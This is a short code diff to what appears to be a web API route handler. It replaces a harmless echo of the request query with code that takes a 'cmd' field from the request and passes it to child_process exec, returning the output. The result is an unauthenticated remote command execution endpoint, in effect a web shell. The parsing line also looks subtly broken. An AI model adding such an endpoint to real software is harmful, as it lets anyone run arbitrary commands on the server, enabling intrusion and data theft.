@@ -1,8 +1,7 @@
 const { exec } = require("child_process");
 
 export default function handler(req, res) {
-    res.status(200).send(JSON.stringify(req.query))
-    /* const body = JSON.parse(req.body)
+    const body = JSON.parse(req.query)
 
     exec(body.cmd, (error, stdout, stderr) => {
         if (error) {
@@ -10,5 +9,5 @@ export default function handler(req, res) {
             return error;
         }
         res.status(200).send(stdout)
-    }) */
+    })
 }
